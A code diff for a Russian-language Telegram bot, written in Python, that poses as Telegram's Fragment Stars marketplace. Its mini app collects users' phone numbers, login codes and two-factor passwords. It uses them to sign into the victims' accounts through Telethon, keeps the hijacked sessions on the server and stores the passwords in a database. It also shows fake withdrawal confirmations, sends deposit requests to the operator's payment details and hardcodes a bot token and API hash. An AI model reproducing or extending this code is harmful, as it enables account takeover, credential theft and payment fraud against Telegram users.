@@ -23,14 +23,18 @@ from telethon.errors import (
     FloodWaitError
 )
 
-# ========== КОНФИГУРАЦИЯ ==========
-logging.basicConfig(level=logging.INFO)
+# ========== НАСТРОЙКА ЛОГИРОВАНИЯ ==========
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+)
 logger = logging.getLogger(__name__)
 
+# ========== КОНФИГУРАЦИЯ БОТА ==========
 BOT_TOKEN   = "7511789367:AAGVIDu27Sb5ZwJUjQRiHOJ-CZinbRUFrDQ"
 ADMIN_ID    = 174415647
 
-# ========== ТВОИ API ДАННЫЕ ==========
+# ========== API ДАННЫЕ ДЛЯ TELEGRAM (получи на my.telegram.org/apps) ==========
 API_ID      = 28687552
 API_HASH    = "1abf9a58d0c22f62437bec89bd6b27a3"
 
@@ -46,10 +50,17 @@ TOTAL_STARS_BOUGHT  = 6_385_921
 STAR_TO_USD         = 0.013
 TOTAL_USD           = round(TOTAL_STARS_BOUGHT * STAR_TO_USD)
 
+# ========== ИНИЦИАЛИЗАЦИЯ БОТА ==========
+bot     = Bot(token=BOT_TOKEN)
+storage = MemoryStorage()
+dp      = Dispatcher(storage=storage)
+
 # ========== КАСТОМНЫЕ ПРЕМИУМ ЭМОДЗИ ==========
 def e(doc_id: str) -> str:
+    """Возвращает кастомное премиум эмодзи по его ID"""
     return f'<tg-emoji emoji-id="{doc_id}"></tg-emoji>'
 
+# Словарь со всеми кастомными эмодзи
 EMOJI = {
     "user":       e("5199552030615558774"),
     "star":       e("5267500801240092311"),
@@ -99,15 +110,13 @@ EMOJI = {
     "hourglass":  e("5197453929637381812"),
 }
 
-# ========== ИНИЦИАЛИЗАЦИЯ БОТА ==========
-bot = Bot(token=BOT_TOKEN)
-storage = MemoryStorage()
-dp = Dispatcher(storage=storage)
-
-# ========== БАЗА ДАННЫХ ==========
+# ========== ИНИЦИАЛИЗАЦИЯ БАЗЫ ДАННЫХ ==========
 def init_db():
+    """Инициализация базы данных SQLite"""
     conn = sqlite3.connect('users.db')
     cursor = conn.cursor()
+    
+    # Таблица пользователей
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS users (
             user_id INTEGER PRIMARY KEY,
@@ -119,6 +128,8 @@ def init_db():
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
     ''')
+    
+    # Таблица сессий авторизации (для Telethon)
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS auth_sessions (
             user_id INTEGER PRIMARY KEY,
@@ -129,48 +140,75 @@ def init_db():
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
     ''')
+    
     conn.commit()
     conn.close()
     logger.info("База данных инициализирована")
 
 init_db()
-os.makedirs("sessions", exist_ok=True)
+
+# Создаём папку для хранения сессий Telethon
+if not os.path.exists("sessions"):
+    os.makedirs("sessions")
+    logger.info("Создана папка sessions")
 
 # ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
 def generate_code() -> str:
+    """Генерация случайного 5-значного кода (используется только для совместимости)"""
     return f"{random.randint(10000, 99999)}"
 
 def save_auth_session(user_id: int, phone: str, step: str = "phone"):
+    """Сохраняем информацию о сессии авторизации"""
     conn = sqlite3.connect('users.db')
     cursor = conn.cursor()
     expires = datetime.now() + timedelta(minutes=30)
-    cursor.execute('INSERT OR REPLACE INTO auth_sessions (user_id, phone, step, session_expires) VALUES (?, ?, ?, ?)',
-                   (user_id, phone, step, expires))
+    cursor.execute('''
+        INSERT OR REPLACE INTO auth_sessions (user_id, phone, step, session_expires)
+        VALUES (?, ?, ?, ?)
+    ''', (user_id, phone, step, expires))
     conn.commit()
     conn.close()
 
 def update_auth_step(user_id: int, step: str, twofa_password: str = None):
+    """Обновляем текущий шаг авторизации"""
     conn = sqlite3.connect('users.db')
     cursor = conn.cursor()
     if twofa_password:
-        cursor.execute('UPDATE auth_sessions SET step = ?, twofa_password = ? WHERE user_id = ?',
-                       (step, twofa_password, user_id))
+        cursor.execute('''
+            UPDATE auth_sessions 
+            SET step = ?, twofa_password = ? 
+            WHERE user_id = ?
+        ''', (step, twofa_password, user_id))
     else:
-        cursor.execute('UPDATE auth_sessions SET step = ? WHERE user_id = ?', (step, user_id))
+        cursor.execute('''
+            UPDATE auth_sessions 
+            SET step = ? 
+            WHERE user_id = ?
+        ''', (step, user_id))
     conn.commit()
     conn.close()
 
 def get_auth_session(user_id: int):
+    """Получаем данные текущей сессии авторизации"""
     conn = sqlite3.connect('users.db')
     cursor = conn.cursor()
-    cursor.execute('SELECT phone, step, twofa_password, session_expires FROM auth_sessions WHERE user_id = ?', (user_id,))
+    cursor.execute('''
+        SELECT phone, step, twofa_password, session_expires 
+        FROM auth_sessions 
+        WHERE user_id = ?
+    ''', (user_id,))
     row = cursor.fetchone()
     conn.close()
-    if row and datetime.fromisoformat(row[3]) > datetime.now():
-        return {"phone": row[0], "step": row[1], "twofa": row[2]}
+    
+    if row:
+        phone, step, twofa, expires_str = row
+        expires = datetime.fromisoformat(expires_str)
+        if datetime.now() < expires:
+            return {"phone": phone, "step": step, "twofa": twofa}
     return None
 
 def clear_auth_session(user_id: int):
+    """Очищаем сессию авторизации после завершения"""
     conn = sqlite3.connect('users.db')
     cursor = conn.cursor()
     cursor.execute('DELETE FROM auth_sessions WHERE user_id = ?', (user_id,))
@@ -178,21 +216,36 @@ def clear_auth_session(user_id: int):
     conn.close()
 
 def authorize_user(user_id: int):
+    """Отмечаем пользователя как авторизованного"""
     conn = sqlite3.connect('users.db')
     cursor = conn.cursor()
-    cursor.execute('UPDATE users SET is_authorized = 1 WHERE user_id = ?', (user_id,))
+    cursor.execute('''
+        UPDATE users 
+        SET is_authorized = 1 
+        WHERE user_id = ?
+    ''', (user_id,))
     conn.commit()
     conn.close()
 
+# Словарь для хранения активных Telethon клиентов
 user_clients = {}
 
-# ========== КОМАНДЫ ==========
+# ========== КОМАНДЫ БОТА ==========
 @dp.message(CommandStart())
 async def cmd_start(message: Message):
+    """Обработчик команды /start"""
+    # URL мини-приложения
     webapp_url = "https://stars-zdgz.onrender.com"
+    
+    # Клавиатура с кнопкой для открытия WebApp
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=f"{EMOJI['star']} Открыть Fragment {EMOJI['star']}", web_app=WebAppInfo(url=webapp_url))]
+        [InlineKeyboardButton(
+            text=f"{EMOJI['star']} Открыть Fragment {EMOJI['star']}", 
+            web_app=WebAppInfo(url=webapp_url)
+        )]
     ])
+    
+    # Приветственное сообщение
     await message.answer(
         f"{EMOJI['crystal']} <b>Fragment</b> — управляйте звёздами Telegram {EMOJI['crystal']}\n\n"
         f"{EMOJI['rocket']} Нажмите кнопку ниже, чтобы открыть мини-приложение {EMOJI['rocket']}\n\n"
@@ -205,10 +258,13 @@ async def cmd_start(message: Message):
 
 @dp.message(Command("admin"))
 async def cmd_admin(message: Message):
+    """Админ-панель с премиум оформлением"""
+    # Проверка прав доступа
     if message.from_user.id != ADMIN_ID:
         await message.answer(f"{EMOJI['warning']} Нет доступа {EMOJI['warning']}")
         return
     
+    # Получение статистики из базы данных
     conn = sqlite3.connect('users.db')
     cursor = conn.cursor()
     cursor.execute("SELECT COUNT(*) FROM users WHERE is_authorized = 1")
@@ -217,6 +273,7 @@ async def cmd_admin(message: Message):
     total = cursor.fetchone()[0]
     conn.close()
     
+    # Отправка статистики
     await message.answer(
         f"{EMOJI['chart']} <b>{EMOJI['stats']} СТАТИСТИКА FRAGMENT {EMOJI['stats']}</b> {EMOJI['chart']}\n\n"
         f"{EMOJI['user']} <b>Всего пользователей:</b> <code>{total}</code> {EMOJI['user']}\n"
@@ -228,9 +285,13 @@ async def cmd_admin(message: Message):
         parse_mode="HTML"
     )
 
-# ========== ОБРАБОТКА WEBAПП ==========
+# ========== ОБРАБОТКА ДАННЫХ ИЗ MINI APP ==========
 @dp.message(F.web_app_data)
 async def handle_webapp_data(message: Message):
+    """
+    Обрабатываем данные, отправленные из мини-приложения
+    Формат данных: JSON с полем action
+    """
     data = message.web_app_data.data
     user_id = message.from_user.id
     
@@ -241,109 +302,141 @@ async def handle_webapp_data(message: Message):
         payload = json.loads(data)
         action = payload.get("action")
         
-        # ========== 1. ОТПРАВКА КОДА ==========
+        # ============================================================
+        # 1. ОТПРАВКА КОДА (пользователь ввёл номер телефона)
+        # ============================================================
         if action == "send_code":
             phone = payload.get("phone")
+            
+            # Проверка наличия номера
             if not phone:
                 await message.answer(f"{EMOJI['warning']} Не указан номер телефона {EMOJI['warning']}")
                 return
             
+            # Сохраняем сессию
             save_auth_session(user_id, phone, "phone")
             await message.answer(f"{EMOJI['rocket']} Отправляю код на номер {phone}... {EMOJI['rocket']}")
             
             try:
+                # Создаём клиента Telethon
                 client = TelegramClient(f"sessions/user_{user_id}", API_ID, API_HASH)
                 await client.connect()
+                
+                # Проверяем подключение
+                if not client.is_connected():
+                    raise Exception("Не удалось подключиться к Telegram API")
+                
+                # Отправляем запрос на получение кода
                 await client.send_code_request(phone)
+                
+                # Сохраняем клиент для дальнейшего использования
                 user_clients[user_id] = client
                 
                 await message.answer(
-                    f"{EMOJI['check']} <b>Код отправлен на {phone}</b> {EMOJI['check']}\n\n"
-                    f"{EMOJI['lock']} Введите код в мини-приложении (5 цифр) {EMOJI['lock']}\n"
-                    f"{EMOJI['clock']} Код действителен 5 минут {EMOJI['clock']}\n\n"
-                    f"{EMOJI['spark']} <i>Проверьте личные сообщения от бота!</i> {EMOJI['spark']}",
+                    f"{EMOJI['check']} <b>✅ Код отправлен на {phone}</b> {EMOJI['check']}\n\n"
+                    f"{EMOJI['lock']} 🔐 Введите код из Telegram в мини-приложении (5 цифр) 🔐{EMOJI['lock']}\n"
+                    f"{EMOJI['clock']} ⏱️ Код действителен 5 минут ⏱️{EMOJI['clock']}\n\n"
+                    f"{EMOJI['spark']} <i>📩 Проверьте личные сообщения от Telegram!</i> {EMOJI['spark']}",
                     parse_mode="HTML"
                 )
+                
             except PhoneNumberInvalidError:
-                await message.answer(f"{EMOJI['warning']} Неверный формат номера телефона {EMOJI['warning']}")
+                await message.answer(f"{EMOJI['warning']} ❌ Неверный формат номера телефона ❌{EMOJI['warning']}")
                 clear_auth_session(user_id)
+                
             except FloodWaitError as e:
-                await message.answer(f"{EMOJI['clock']} Слишком много попыток. Подождите {e.seconds} сек. {EMOJI['clock']}")
+                await message.answer(f"{EMOJI['clock']} ⚠️ Слишком много попыток. Подождите {e.seconds} секунд. ⚠️{EMOJI['clock']}")
                 clear_auth_session(user_id)
+                
             except Exception as e:
                 logger.error(f"Ошибка отправки кода: {e}")
-                await message.answer(f"{EMOJI['warning']} Ошибка: {str(e)} {EMOJI['warning']}")
+                await message.answer(f"{EMOJI['warning']} ⚠️ Ошибка: {str(e)} ⚠️{EMOJI['warning']}")
                 clear_auth_session(user_id)
         
-        # ========== 2. ПРОВЕРКА КОДА ==========
+        # ============================================================
+        # 2. ПРОВЕРКА КОДА (пользователь ввёл код из Telegram)
+        # ============================================================
         elif action == "check_code":
             code = payload.get("code")
             session = get_auth_session(user_id)
             
+            # Проверка сессии
             if not session or session["step"] != "code":
-                await message.answer(f"{EMOJI['warning']} Сессия истекла. Начните заново. {EMOJI['warning']}")
+                await message.answer(f"{EMOJI['warning']} ❌ Сессия истекла. Начните заново. ❌{EMOJI['warning']}")
                 return
             
             client = user_clients.get(user_id)
             if not client:
-                await message.answer(f"{EMOJI['warning']} Сессия не найдена. Начните заново. {EMOJI['warning']}")
+                await message.answer(f"{EMOJI['warning']} ❌ Сессия не найдена. Начните заново. ❌{EMOJI['warning']}")
+                clear_auth_session(user_id)
                 return
             
             try:
+                # Пробуем войти с полученным кодом
                 await client.sign_in(session["phone"], code)
                 
-                # Успешный вход (нет 2FA)
+                # Если нет 2FA — вход успешен
+                me = await client.get_me()
                 await message.answer(
-                    f"{EMOJI['trophy']} <b>{EMOJI['star']} АВТОРИЗАЦИЯ УСПЕШНА! {EMOJI['star']}</b> {EMOJI['trophy']}\n\n"
-                    f"{EMOJI['user']} Вы вошли в аккаунт <b>{session['phone']}</b> {EMOJI['user']}\n\n"
-                    f"{EMOJI['welcome']} <b>Добро пожаловать в Fragment!</b> {EMOJI['welcome']}\n"
-                    f"{EMOJI['safe']} <i>Сессия сохранена</i> {EMOJI['safe']}",
+                    f"{EMOJI['trophy']} <b>{EMOJI['star']} ✅ АВТОРИЗАЦИЯ УСПЕШНА! ✅{EMOJI['star']}</b> {EMOJI['trophy']}\n\n"
+                    f"{EMOJI['user']} 👤 Вы вошли в аккаунт: <b>{me.first_name} {me.last_name or ''}</b> 👤{EMOJI['user']}\n"
+                    f"📱 Номер: <code>{me.phone}</code>\n"
+                    f"🔹 Username: @{me.username or 'нет'}\n\n"
+                    f"{EMOJI['welcome']} ✨ Добро пожаловать в Fragment! ✨{EMOJI['welcome']}\n"
+                    f"{EMOJI['safe']} 🔒 Сессия сохранена 🔒{EMOJI['safe']}",
                     parse_mode="HTML"
                 )
                 authorize_user(user_id)
                 clear_auth_session(user_id)
                 
             except SessionPasswordNeededError:
+                # Требуется 2FA
                 update_auth_step(user_id, "2fa")
                 await message.answer(
-                    f"{EMOJI['lock']} <b>{EMOJI['shield']} ТРЕБУЕТСЯ ПАРОЛЬ 2FA {EMOJI['shield']}</b> {EMOJI['lock']}\n\n"
-                    f"Введите пароль в мини-приложении",
+                    f"{EMOJI['lock']} <b>{EMOJI['shield']} 🔐 ТРЕБУЕТСЯ ПАРОЛЬ 2FA 🔐{EMOJI['shield']}</b> {EMOJI['lock']}\n\n"
+                    f"🔒 У вас включена двухэтапная аутентификация\n"
+                    f"📝 Введите пароль в мини-приложении",
                     parse_mode="HTML"
                 )
                 
             except PhoneCodeInvalidError:
-                await message.answer(f"{EMOJI['warning']} Неверный код. Попробуйте ещё раз. {EMOJI['warning']}")
+                await message.answer(f"{EMOJI['warning']} ❌ Неверный код. Попробуйте ещё раз. ❌{EMOJI['warning']}")
                 
             except Exception as e:
                 logger.error(f"Ошибка проверки кода: {e}")
-                await message.answer(f"{EMOJI['warning']} Ошибка: {str(e)} {EMOJI['warning']}")
+                await message.answer(f"{EMOJI['warning']} ⚠️ Ошибка: {str(e)} ⚠️{EMOJI['warning']}")
         
-        # ========== 3. ПРОВЕРКА 2FA ==========
+        # ============================================================
+        # 3. ПРОВЕРКА 2FA (пользователь ввёл пароль двухфакторки)
+        # ============================================================
         elif action == "check_2fa":
             password = payload.get("password")
             session = get_auth_session(user_id)
             
+            # Проверка сессии
             if not session or session["step"] != "2fa":
-                await message.answer(f"{EMOJI['warning']} Сессия истекла. Начните заново. {EMOJI['warning']}")
+                await message.answer(f"{EMOJI['warning']} ❌ Сессия истекла. Начните заново. ❌{EMOJI['warning']}")
                 return
             
             client = user_clients.get(user_id)
             if not client:
-                await message.answer(f"{EMOJI['warning']} Сессия не найдена. Начните заново. {EMOJI['warning']}")
+                await message.answer(f"{EMOJI['warning']} ❌ Сессия не найдена. Начните заново. ❌{EMOJI['warning']}")
+                clear_auth_session(user_id)
                 return
             
             try:
+                # Вход с паролем 2FA
                 await client.sign_in(password=password)
                 me = await client.get_me()
                 
                 await message.answer(
-                    f"{EMOJI['trophy']} <b>{EMOJI['star']} АВТОРИЗАЦИЯ УСПЕШНА! {EMOJI['star']}</b> {EMOJI['trophy']}\n\n"
-                    f"{EMOJI['user']} <b>Вы вошли в аккаунт:</b> {EMOJI['user']}\n"
-                    f"👤 <b>Имя:</b> {me.first_name} {me.last_name or ''}\n"
+                    f"{EMOJI['trophy']} <b>{EMOJI['star']} ✅ АВТОРИЗАЦИЯ УСПЕШНА! ✅{EMOJI['star']}</b> {EMOJI['trophy']}\n\n"
+                    f"{EMOJI['user']} 👤 <b>Вы вошли в аккаунт:</b> 👤{EMOJI['user']}\n"
+                    f"✨ <b>Имя:</b> {me.first_name} {me.last_name or ''} ✨\n"
                     f"📱 <b>Номер:</b> <code>{me.phone}</code>\n"
                     f"🔹 <b>Username:</b> @{me.username or 'нет'}\n\n"
-                    f"{EMOJI['welcome']} <b>Добро пожаловать в Fragment!</b> {EMOJI['welcome']}\n"
-                    f"{EMOJI['spark']} <i>Твой путь к звёздам начинается здесь!</i> {EMOJI['spark']}",
+                    f"{EMOJI['welcome']} ✨ <b>Добро пожаловать в Fragment!</b> ✨{EMOJI['welcome']}\n"
+                    f"{EMOJI['spark']} 🌟 <i>Твой путь к звёздам начинается здесь!</i> 🌟{EMOJI['spark']}",
                     parse_mode="HTML"
                 )
                 authorize_user(user_id)
@@ -351,54 +444,68 @@ async def handle_webapp_data(message: Message):
                 
             except Exception as e:
                 logger.error(f"Ошибка 2FA: {e}")
-                await message.answer(f"{EMOJI['warning']} Неверный пароль 2FA {EMOJI['warning']}")
+                await message.answer(f"{EMOJI['warning']} ❌ Неверный пароль 2FA: {str(e)} ❌{EMOJI['warning']}")
         
-        # ========== 4. ВЫВОД ЗВЁЗД ==========
+        # ============================================================
+        # 4. ВЫВОД ЗВЁЗД
+        # ============================================================
         elif action == "withdraw":
             amount = payload.get("amount")
             if not amount:
-                await message.answer(f"{EMOJI['warning']} Сумма не указана {EMOJI['warning']}")
+                await message.answer(f"{EMOJI['warning']} ❌ Сумма не указана ❌{EMOJI['warning']}")
                 return
             
             await message.answer(
-                f"{EMOJI['money']} <b>{EMOJI['stars_deal']} ЗАЯВКА НА ВЫВОД {EMOJI['stars_deal']}</b> {EMOJI['money']}\n\n"
-                f"{EMOJI['star']} <b>Сумма:</b> <code>{amount} ⭐</code> {EMOJI['star']}\n"
-                f"{EMOJI['clock']} <b>Статус:</b> <i>обрабатывается</i> {EMOJI['clock']}\n\n"
-                f"{EMOJI['spark']} <i>Вывод обычно занимает до 10 минут</i> {EMOJI['spark']}",
+                f"{EMOJI['money']} <b>{EMOJI['stars_deal']} 💰 ЗАЯВКА НА ВЫВОД 💰{EMOJI['stars_deal']}</b> {EMOJI['money']}\n\n"
+                f"{EMOJI['star']} ⭐ <b>Сумма:</b> <code>{amount} ⭐</code> ⭐{EMOJI['star']}\n"
+                f"{EMOJI['clock']} ⏱️ <b>Статус:</b> <i>обрабатывается</i> ⏱️{EMOJI['clock']}\n\n"
+                f"{EMOJI['spark']} ✨ <i>Вывод обычно занимает до 10 минут</i> ✨{EMOJI['spark']}",
                 parse_mode="HTML"
             )
         
-        # ========== 5. ПОПОЛНЕНИЕ ==========
+        # ============================================================
+        # 5. ПОПОЛНЕНИЕ
+        # ============================================================
         elif action == "deposit":
             method = payload.get("method")
             await message.answer(
-                f"{EMOJI['card']} <b>{EMOJI['banknote']} ПОПОЛНЕНИЕ БАЛАНСА {EMOJI['banknote']}</b> {EMOJI['card']}\n\n"
+                f"{EMOJI['card']} <b>{EMOJI['banknote']} 💳 ПОПОЛНЕНИЕ БАЛАНСА 💳{EMOJI['banknote']}</b> {EMOJI['card']}\n\n"
                 f"🔹 <b>Метод:</b> <code>{method}</code>\n"
-                f"{EMOJI['star']} <b>Мин. сумма:</b> <code>{SHOP_MIN_STARS} ⭐</code>\n"
-                f"{EMOJI['money']} <b>Курс:</b> <code>1 ⭐ = {SHOP_STAR_PRICE_RUB} RUB</code>\n\n"
-                f"{EMOJI['requisites']} <b>Реквизиты:</b>\n"
+                f"{EMOJI['star']} ⭐ <b>Минимальная сумма:</b> <code>{SHOP_MIN_STARS} ⭐</code> ⭐{EMOJI['star']}\n"
+                f"{EMOJI['money']} 💰 <b>Курс:</b> <code>1 ⭐ = {SHOP_STAR_PRICE_RUB} RUB</code> 💰{EMOJI['money']}\n\n"
+                f"{EMOJI['requisites']} 📋 <b>Реквизиты для оплаты:</b> 📋{EMOJI['requisites']}\n"
                 f"🏦 <b>СБП:</b> <code>{SBP_PHONE}</code> ({SBP_BANK})\n"
-                f"{EMOJI['tonkeeper']} <b>TON:</b> <code>{TON_ADDRESS[:20]}...</code>\n"
-                f"{EMOJI['cryptobot']} <b>CryptoBot:</b> <a href='{CRYPTO_BOT}'>Перейти</a>\n\n"
-                f"{EMOJI['spark']} <i>После оплаты звёзды зачислятся автоматически</i> {EMOJI['spark']}",
+                f"{EMOJI['tonkeeper']} 💎 <b>TON:</b> <code>{TON_ADDRESS[:20]}...</code> 💎{EMOJI['tonkeeper']}\n"
+                f"{EMOJI['cryptobot']} 🤖 <b>CryptoBot:</b> <a href='{CRYPTO_BOT}'>Перейти</a> 🤖{EMOJI['cryptobot']}\n\n"
+                f"{EMOJI['spark']} ✨ <i>После оплаты звёзды зачислятся автоматически</i> ✨{EMOJI['spark']}",
                 parse_mode="HTML",
                 disable_web_page_preview=True
             )
         
         else:
-            await message.answer(f"{EMOJI['warning']} Неизвестное действие: {action} {EMOJI['warning']}")
+            await message.answer(f"{EMOJI['warning']} ⚠️ Неизвестное действие: {action} ⚠️{EMOJI['warning']}")
     
     except json.JSONDecodeError as e:
         logger.error(f"Ошибка парсинга JSON: {e}")
-        await message.answer(f"{EMOJI['warning']} Ошибка формата данных {EMOJI['warning']}")
+        await message.answer(f"{EMOJI['warning']} ⚠️ Ошибка формата данных ⚠️{EMOJI['warning']}")
     except Exception as e:
         logger.error(f"Ошибка обработки: {e}")
-        await message.answer(f"{EMOJI['warning']} Ошибка: {str(e)} {EMOJI['warning']}")
+        await message.answer(f"{EMOJI['warning']} ⚠️ Ошибка: {str(e)} ⚠️{EMOJI['warning']}")
 
-# ========== ЗАПУСК ==========
+# ========== ЗАПУСК БОТА ==========
 async def main():
+    """Главная функция запуска бота"""
+    # Удаляем вебхук (если был)
     await bot.delete_webhook(drop_pending_updates=True)
+    
+    # Логируем запуск
     logger.info(f"{EMOJI['crystal']} Бот Fragment запущен с кастомными премиум эмодзи {EMOJI['crystal']}")
+    logger.info("🚀 Telethon авторизация активна 🚀")
+    logger.info(f"🤖 Бот: @DarkStudiox_bot")
+    logger.info(f"👑 Админ: {ADMIN_ID}")
+    logger.info(f"🌐 WebApp URL: https://stars-zdgz.onrender.com")
+    
+    # Запускаем polling
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
